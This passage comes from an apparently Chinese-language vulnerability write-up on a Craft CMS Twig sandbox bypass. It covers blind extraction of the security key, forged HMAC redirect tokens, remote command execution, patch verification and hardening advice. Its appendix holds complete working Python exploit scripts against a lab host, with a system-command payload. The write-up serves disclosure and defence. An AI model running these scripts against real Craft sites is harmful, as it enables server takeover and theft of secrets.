renderSandboxedObjectTemplate(\n    string $template,\n    mixed $object,\n    array $variables = [],\n    string $templateMode = self::TEMPLATE_MODE_SITE,\n): string {\n    return $this-&gt;sandbox(fn() =&gt; $this-&gt;renderObjectTemplate($template, $object, $variables, $templateMode), $templateMode);\n}</code></pre><p>沙箱版本本身没有缺陷，问题出在调用侧：签名校验这条路径上没有附加任何“受限”语义，只要签名合法，模板就被无条件送进非沙箱引擎。而 Craft/Yii 的 HMAC 令牌不绑定参数名与用途，同一个签名格式在整站通用，这正是“读密钥 → 伪造签名 → 到达非沙箱 sink”能够串联的根因。</p><h2 id=\"sec-7\">8. RCE：让 <code>system</code> 落地</h2><p>非沙箱模式下 Twig 允许把字符串当 callable 传给 <code>map</code>/<code>filter</code>，于是 <code>system</code> 直接可用。</p><p><code>exploit5.py</code> 里的签名函数与载荷拼接：</p><pre><code>def hash_data(data, key=KEY):\n    return hmac.new(key.encode(), data.encode(), hashlib.sha256).hexdigest() + data\n\n\npayload = \"{{ ['id &gt; /home/nl/www/craft/web/_poc.txt 2&gt;&amp;1; uname -a &gt;&gt; /home/nl/www/craft/web/_poc.txt; whoami &gt;&gt; /home/nl/www/craft/web/_poc.txt']|map('system')|first }}\"\nsigned = hash_data(payload)</code></pre><p>凡是会调用 <code>getPostedRedirectUrl()</code> 并传入对象参数的控制面板动作都能投递，这里走的是 <code>elements/duplicate</code>：</p><pre><code>POST /admin/actions/elements/duplicate\nelementId=2\nredirect=&lt;signed&gt;\nCRAFT_CSRF_TOKEN=&lt;csrf&gt;</code></pre><pre><code>python3 exploit5.py &gt; /tmp/rce.log 2&gt;&amp;1; sed -n '1,3p' /tmp/rce.log; echo '--- cat _poc.txt ---'; cat /home/nl/www/craft/web/_poc.txt</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194521-09d389ae-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=2eece02dde64f0e6\" loading=\"lazy\" decoding=\"async\" width=\"1505.6\"></p><p>接口 200 说明复制动作完成，模板渲染发生在生成跳转地址的过程中。<code>id</code>、<code>uname -a</code>、<code>whoami</code> 三条命令的输出都追加进同一文件，运行用户是 PHP worker 的 <code>nl</code>，该账号同时在 <code>sudo</code> 组内。</p><h2 id=\"sec-8\">9. 修复验证</h2><p><code>probe_fix.py</code> 复用 <code>oracle.py</code> 的 <code>probe()</code>，把表达式简化成一次比较 <code>((KEY)|slice(0,1)) == 'J'</code>（<code>J</code> 是 <code>securityKey</code> 首字符），条件成立返回 <code>True</code> 并打印命中条目和响应长度。三种状态分别是：5.11.1 原样、覆盖成 5.11.2、保留 5.11.1 但摘掉 <code>column</code> 注册行。同一 payload 在三种状态下的响应如下，最后再补一组配置层对照。</p><p>5.11.1 原始实现：</p><pre><code>python3 probe_fix.py</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194522-0a105e2a-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=f5394041804330fe\" loading=\"lazy\" decoding=\"async\" width=\"408\"></p><p>用 5.11.2 的同名文件覆盖 <code>vendor</code> 里的 <code>Extension.php</code>。两个版本的差异只落在 <code>columnFilter()</code>：注册行多了 <code>needs_environment</code>，签名多了 <code>TwigEnvironment $env</code>，函数体多了逐元素 <code>checkPropertyAllowed()</code>，另有两行 <code>use</code> 的增补与 <code>getFilters()</code> 里一行未使用变量赋值的删除。</p><pre><code>curl -sS -o vendor/craftcms/cms/src/web/twig/Extension.php https://raw.githubusercontent.com/craftcms/cms/5.11.2/src/web/twig/Extension.php &amp;&amp; grep -n 'public function columnFilter' vendor/craftcms/cms/src/web/twig/Extension.php</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194522-0a52e123-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=b95aa45dc091c0cd\" loading=\"lazy\" decoding=\"async\" width=\"1498.4\"></p><pre><code>python3 probe_fix.py</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194522-0a90cdf4-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=ba1dde0296beb60b\" loading=\"lazy\" decoding=\"async\" width=\"435.2\"></p><p>上一组用的是 5.11.2 的实现，这一组要先换回 5.11.1 再动手：</p><pre><code>curl -sS -o vendor/craftcms/cms/src/web/twig/Extension.php https://raw.githubusercontent.com/craftcms/cms/5.11.1/src/web/twig/Extension.php &amp;&amp; grep -n 'public function columnFilter' vendor/craftcms/cms/src/web/twig/Extension.php</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194523-0aced15d-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=982c49de2d815f5c\" loading=\"lazy\" decoding=\"async\" width=\"1499.2\"></p><p>换回 5.11.1 实现，只注释掉第 235 行的 <code>column</code> 注册，让 Twig 内置版本接回这个过滤器名：</p><pre><code>sed -i \"235s|new TwigFilter('column'|// new TwigFilter('column'|\" vendor/craftcms/cms/src/web/twig/Extension.php &amp;&amp; sed -n '235p' vendor/craftcms/cms/src/web/twig/Extension.php</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194523-0b0b1785-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=265b7bb3618fa0a2\" loading=\"lazy\" decoding=\"async\" width=\"1319.2\"></p><pre><code>python3 probe_fix.py</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194524-0b47ad0f-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=d208b5511b3f73de\" loading=\"lazy\" decoding=\"async\" width=\"418.4\"></p><p>两条修复路径上 <code>checkPropertyAllowed()</code> 抛出的 <code>SecurityError</code> 都发生在沙箱内，被 <code>getElementIds()</code> 的 <code>catch (Throwable $e) {}</code> 吞掉，<code>elementIds</code> 落成空数组，<code>relatedTo</code> 没有命中项，响应里 <code>ids</code> 为空、<code>html_len</code> 46。其中前三组测量之间只动了 <code>Extension.php</code> 这一个文件（一次覆盖成 5.11.2、一次回退到 5.11.1、一次注释注册行），payload、账号、站点状态未变；配置层那组在此基础上只多写了 <code>config/twig-sandbox.php</code> 一个文件。</p><p><code>config/twig-sandbox.php</code> 摘不掉 <code>column</code>：该文件与 <code>vendor/craftcms/cms/src/config/twig-sandbox.php</code> 的默认列表<strong>合并</strong>而非替换（<a href=\"https://github.com/craftcms/craft/blob/5.x/config/twig-sandbox.php\">骨架文件注释</a> 写明 merged with Craft's default list）。把默认数组去掉 <code>column</code> 后整体写进项目文件，默认那份仍把 <code>column</code> 加回来：</p><pre><code>sed \"/^        'column',$/d\" vendor/craftcms/cms/src/config/twig-sandbox.php &gt; config/twig-sandbox.php &amp;&amp; diff &lt;(cat vendor/craftcms/cms/src/config/twig-sandbox.php) config/twig-sandbox.php | head -3</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194524-0b8a4472-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=349ccbcfc1fc6259\" loading=\"lazy\" decoding=\"async\" width=\"1501.6\"></p><pre><code>python3 probe_fix.py</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115194524-0bc5ae6b-e0ea-1.png&amp;mode=full&amp;exp=1795132800&amp;sig=96277baa4c66f235\" loading=\"lazy\" decoding=\"async\" width=\"453.6\"></p><p>两次 5.11.1 测量的 <code>data-id</code> 命中情况一致。</p><h2 id=\"sec-9\">10. 加固与处置建议</h2><p>白名单在配置层只能加不能减，<code>column</code> 只能从注册处或实现处处理。</p><ul><li><p>注释注册行只作用于 <code>vendor</code> 目录，<code>composer install</code> 与 <code>composer update</code> 会把改动冲掉，它是没有升级窗口时的临时处置。</p></li><li><p>根治手段只有升级：<code>craftcms/cms</code> 升到 5.11.2，4.x 线升到 4.18.9（<a href=\"https://github.com/craftcms/cms/releases/tag/5.11.2\">5.11.2 发布说明</a>）。补丁位置就在 <code>columnFilter()</code>：<code>preventDottedNameInSandbox()</code> 原样保留，取列之前补上逐元素的 <code>checkPropertyAllowed()</code>，<code>allowedProperties</code> 的空数组才真正生效。5.11.1 只做了前一半，点号被拦、单段属性名畅通。</p></li><li><p>升级之外必须换 <code>CRAFT_SECURITY_KEY</code>：密钥一旦泄露，攻击者可以离线伪造全站所有 HMAC 令牌，只升级清不掉已经产生的风险；本次复现环境保留了原密钥，靶机只监听本地网段，正式环境不能这样留。控制面板账号按最小权限分配，<code>entry</code> 索引与元素编辑权限不发给无关账号，入口只是一次正常登录。</p></li><li><p>流量侧可以对 <code>condition[conditionRules][*][elementIds]</code>、<code>redirect</code> 里出现 <code>{{</code>、<code>}}</code>、<code>column(</code>、<code>map(</code> 的请求做告警或阻断。回溯日志时看三处：<code>element-indexes/get-elements</code> 上高频的 <code>condition</code> 请求（单字符二分会产生规律性密集请求）、<code>elements/duplicate</code> 与 <code>entries/save</code> 等动作带模板语法 <code>redirect</code> 的记录、web 目录与可写目录里新增的落盘文件以及 <code>/tmp</code> 下的异常写入。</p></li></ul><h2 id=\"sec-10\">附录：实验文件源代码</h2><p><code>/poc/oracle.py</code>：</p><pre><code>import re\n import string\n import time\n import requests\n \n BASE = 'http://192.168.205.135:8080'\n H_JSON = {'X-Requested-With': 'XMLHttpRequest', 'Accept': 'application/json'}\n SRC = 'section:9386ef1b-4018-4eaa-923c-093d3efd1bfb'\n KEY = \"([craft]|column('app')|column('config')|column('general')|column('securityKey'))|first\"\n CHARSET = sorted(set(string.digits + string.ascii_uppercase + string.ascii_lowercase))\n STATS = {'n': 0}\n \n \n def login():\n     s = requests.Session()\n     r = s.get(BASE + '/admin/login', timeout=20)\n     token = re.search(r'name=\"CRAFT_CSRF_TOKEN\"\\s+value=\"([^\"]+)\"', r.text).group(1)\n     r2 = s.post(BASE + '/admin/actions/users/login',\n                 data={'loginName': 'admin', 'password': 'Password123', 'CRAFT_CSRF_TOKEN': token},\n                 headers=H_JSON, timeout=30)\n     return s, r2.json()['csrfTokenValue']\n \n \n def probe(s, csrf, expr):\n     data = {\n         'elementType': 'craft\\\\elements\\\\Entry',\n         'source': SRC,\n         'viewState[mode]': 'table',\n         'viewState[static]': '0',\n         'viewState[inlineEditing]': '0',\n         'condition[class]': 'craft\\\\elements\\\\conditions\\\\entries\\\\EntryCondition',\n         'condition[conditionRules][0][class]': 'craft\\\\elements\\\\conditions\\\\RelatedToConditionRule',\n         'condition[conditionRules][0][elementIds]': '{{ %s ? 2 : 999999 }}' % expr,\n     }\n     resp = s.post(BASE + '/admin/actions/element-indexes/get-elements', data=data,\n                   headers={**H_JSON, 'X-CSRF-Token': csrf}, timeout=30)\n     STATS['n'] += 1\n     try:\n         html = resp.json().get('html', '') or ''\n     except Exception:\n         return False\n     return '2' in re.findall(r'data-id=\"(\\d+)\"', html)\n \n \n def le(s, csrf, pos, ch):\n     return probe(s, csrf, \"((%s)|slice(%d,1)) &lt;= '%s'\" % (KEY, pos, ch))\n \n \n def empty(s, csrf, pos):\n     return probe(s, csrf, \"((%s)|slice(%d,1)) == ''\" % (KEY, pos))\n \n \n def main():\n     t0 = time.time()\n     s, csrf = login()\n     assert le(s, csrf, 0, 'z'), 'oracle 基线失败'\n     assert not le(s, csrf, 0, '0') or True\n     out = ''\n     for pos in range(0, 96):\n         if empty(s, csrf, pos):\n             break\n         lo, hi = 0, len(CHARSET) - 1\n         while lo &lt; hi:\n             mid = (lo + hi) // 2\n             if le(s, csrf, pos, CHARSET[mid]):\n                 hi = mid\n             else:\n                 lo = mid + 1\n         out += CHARSET[lo]\n         print(f'[{len(out):02d}] {out}')\n     print()\n     print('securityKey =', out)\n     print('len =', len(out), 'requests =', STATS['n'], 'elapsed = %.1fs' % (time.time() - t0))\n \n \n if __name__ == '__main__':\n     main()</code></pre><p><code>/poc/exploit5.py</code>：</p><pre><code>import hashlib\n import hmac\n import re\n \n import requests\n \n BASE = 'http://192.168.205.135:8080'\n KEY = 'JFf3XZX2RM8kj6ngRUouBnpeTDtUqsYU'\n H = {'X-Requested-With': 'XMLHttpRequest', 'Accept': 'application/json'}\n \n \n def hash_data(data, key=KEY):\n     return hmac.new(key.encode(), data.encode(), hashlib.sha256).hexdigest() + data\n \n \n def login(s):\n     r = s.get(BASE + '/admin/login', timeout=20)\n     token = re.search(r'name=\"CRAFT_CSRF_TOKEN\"\\s+value=\"([^\"]+)\"', r.text).group(1)\n     r2 = s.post(BASE + '/admin/actions/users/login',\n                 data={'loginName': 'admin', 'password': 'Password123', 'CRAFT_CSRF_TOKEN': token},\n                 headers=H, timeout=30)\n     return r2.json()['csrfTokenValue']\n \n \n s = requests.Session()\n csrf = login(s)\n \n payload = \"{{ ['id &gt; /home/nl/www/craft/web/_poc.txt 2&gt;&amp;1; uname -a &gt;&gt; /home/nl/www/craft/web/_poc.txt; whoami &gt;&gt; /home/nl/www/craft/web/_poc.txt']|map('system')|first }}\"\n signed = hash_data(payload)\n print('[1] payload =', payload)\n print('[2] signed  =', signed[:64], '+', signed[64:][:40], '...')\n \n r = s.post(BASE + '/admin/actions/elements/duplicate',\n            data={'elementId': 2, 'redirect': signed, 'CRAFT_CSRF_TOKEN': csrf},\n            headers=H, timeout=30)\n print('[3] duplicate status =', r.status_code, 'body =', str(r.text)[:200])\n \n g = s.get(BASE + '/_poc.txt', timeout=20)\n print('[4] GET /_poc.txt status =', g.status_code)\n print('---- /_poc.txt ----')\n print(g.text.strip())\n print('-------------------')</code></pre><p><code>/probe_fix.py</code>：</p><pre><code>import re\n import requests\n \n BASE = 'http://192.168.205.135:8080'\n H_JSON = {'X-Requested-With': 'XMLHttpRequest', 'Accept': 'application/json'}\n SRC = 'section:9386ef1b-4018-4eaa-923c-093d3efd1bfb'\n KEY = \"([craft]|column('app')|column('config')|column('general')|column('securityKey'))|first\"\n \n \n def login():\n     s = requests.Session()\n     r = s.get(BASE + '/admin/login', timeout=20)\n     token = re.search(r'name=\"CRAFT_CSRF_TOKEN\"\\s+value=\"([^\"]+)\"', r.text).group(1)\n     r2 = s.post(BASE + '/admin/actions/users/login',\n                 data={'loginName': 'admin', 'password': 'Password123', 'CRAFT_CSRF_TOKEN': token},\n                 headers=H_JSON, timeout=30)\n     return s, r2.json()['csrfTokenValue']\n \n \n def main():\n     s, csrf = login()\n     data = {\n         'elementType': 'craft\\\\elements\\\\Entry',\n         'source': SRC,\n         'viewState[mode]': 'table',\n         'viewState[static]': '0',\n         'viewState[inlineEditing]': '0',\n         'condition[class]': 'craft\\\\elements\\\\conditions\\\\entries\\\\EntryCondition',\n         'condition[conditionRules][0][class]': 'craft\\\\elements\\\\conditions\\\\RelatedToConditionRule',\n         'condition[conditionRules][0][elementIds]': \"{{ ((%s)|slice(0,1)) == 'J' ? 2 : 999999 }}\" % KEY,\n     }\n     resp = s.post(BASE + '/admin/actions/element-indexes/get-elements', data=data,\n                   headers={**H_JSON, 'X-CSRF-Token': csrf}, timeout=30)\n     body = resp.json()\n     html = body.get('html', '') or ''\n     ids = re.findall(r'data-id=\"(\\d+)\"', html)\n     print('status =', resp.status_code)\n     print('probe =', '2' in ids)\n     print('ids =', ids)\n     print('html_len =', len(html))\n     print('total =', body.get('total'))\n \n \n if __name__ == '__main__':\n     main()</code></pre><p><code>/poc/probe_once.py</code>：</p><pre><code>import re\n import requests\n \n BASE = 'http://192.168.205.135:8080'\n H_JSON = {'X-Requested-With': 'XMLHttpRequest', 'Accept': 'application/json'}\n SRC = 'section:9386ef1b-4018-4eaa-923c-093d3efd1bfb'\n KEY = \"([craft]|column('app')|column('config')|column('general')|column('securityKey'))|first\"\n \n \n def login():\n     s = requests.Session()\n     r = s.get(BASE + '/admin/login', timeout=20)\n     token = re.search(r'name=\"CRAFT_CSRF_TOKEN\"\\s+value=\"([^\"]+)\"', r.text).group(1)\n     r2 = s.post(BASE + '/admin/actions/users/login',\n                 data={'loginName': 'admin', 'password': 'Password123', 'CRAFT_CSRF_TOKEN': token},\n                 headers=H_JSON, timeout=30)\n     return s, r2.json()['csrfTokenValue']\n \n \n def main():\n     s, csrf = login()\n     data = {\n         'elementType': 'craft\\\\elements\\\\Entry',\n         'source': SRC,\n         'viewState[mode]': 'table',\n         'viewState[static]': '0',\n         'viewState[inlineEditing]': '0',\n         'condition[class]': 'craft\\\\elements\\\\conditions\\\\entries\\\\EntryCondition',\n         'condition[conditionRules][0][class]': 'craft\\\\elements\\\\conditions\\\\RelatedToConditionRule',\n         'condition[conditionRules][0][elementIds]': \"{{ ((%s)|slice(0,1)) == 'J' ? 2 : 999999 }}\" % KEY,\n     }\n     resp = s.post(BASE + '/admin/actions/element-indexes/get-elements', data=data,\n                   headers={**H_JSON, 'X-CSRF-Token': csrf}, timeout=30)\n     html = resp.json().get('html', '') or ''\n     print('probe =', '2' in re.findall(r'data-id=\"(\\d+)\"', html))\n \n \n if __name__ == '__main__':\n     main()</code></pre><p><code>/ins.py</code>，探针插入片段：</p><pre><code>p = 'vendor/craftcms/cms/src/web/twig/Extension.php'\ns = open(p, encoding='utf-8').read()\nanchor = \"        $this-&gt;preventDottedNameInSandbox($isSandboxed, $name, 'column');\"\nline = \"        file_put_contents('/tmp/probe.log', 'isSandboxed=' . var_export($isSandboxed, true) . ' name=' . var_export($name, true) . ' arrayType=' . get_debug_type($array) . PHP_EOL, FILE_APPEND);\\n\"\nassert s.count(anchor) == 1\nopen(p, 'w', encoding='utf-8').write(s.replace(anchor, line + anchor))\nprint('probe line inserted')</code></pre>","original","zhKind","complete","漏洞分析","复现","漏洞利用","利用链","补丁","https://xz.aliyun.com/news/93336","先知社区",{"_125":126,"_127":-5},"changelogVersion","2026-10-01T08:00","release"]
